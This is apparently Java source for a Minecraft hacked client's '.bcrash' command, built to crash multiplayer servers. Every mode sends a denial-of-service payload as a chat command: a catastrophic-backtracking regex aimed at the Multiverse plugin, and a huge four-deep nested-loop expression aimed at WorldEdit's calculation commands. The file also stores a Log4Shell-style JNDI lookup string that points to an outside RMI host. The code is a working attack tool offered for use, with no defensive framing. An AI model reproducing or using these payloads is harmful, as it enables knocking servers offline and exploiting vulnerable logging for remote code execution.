package info.sigmaclient.sigma.commands.impl;

import info.sigmaclient.sigma.commands.Command;
import info.sigmaclient.sigma.utils.ChatUtils;
import net.minecraft.network.play.client.*;
public class CrashCommand extends Command {
    String[] crashMode = new String[]{
            "WE", "cxdev1", "cxdev2", "mv"
    };
    public String jndi = "${jndi:rmi://du.pa}";
    @Override
    public void onChat(String[] args, String joinArgs) {
        if(args.length != 1){
            ChatUtils.sendMessageWithPrefix(".crash " + String.join(",", crashMode));
            return;
        }
        boolean c = false;
        for(String s : crashMode){
            if(s.equalsIgnoreCase(args[0])){
                c = true;
            }
        }
        if(!c){
            ChatUtils.sendMessageWithPrefix("\u00a77Not exists mode. \u00a77Do .crash \u00a77" + String.join("\u00a77, ", crashMode));
        }
        switch (args[0].toLowerCase()){
            case "mv":
                mc.getConnection().sendPacket(new CChatMessagePacket(
                        "/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.+)$^^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.+)$^"
                ));
                break;
            case "we":
                mc.getConnection().sendPacket(new CChatMessagePacket("/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"));
                break;
            case "cxdev1":
                mc.getConnection().sendPacket(new CChatMessagePacket("//solve for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"));
                //solve for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}
                break;
            case "cxdev2":
                mc.getConnection().sendPacket(new CChatMessagePacket("//calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"));
                //calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}
                break;
        }
    }

    @Override
    public String usages() {
        return "[mode]";
    }

    @Override
    public String describe() {
        return "Better crasher.";
    }

    @Override
    public String[] getName() {
        return new String[]{"bcrash"};
    }
}
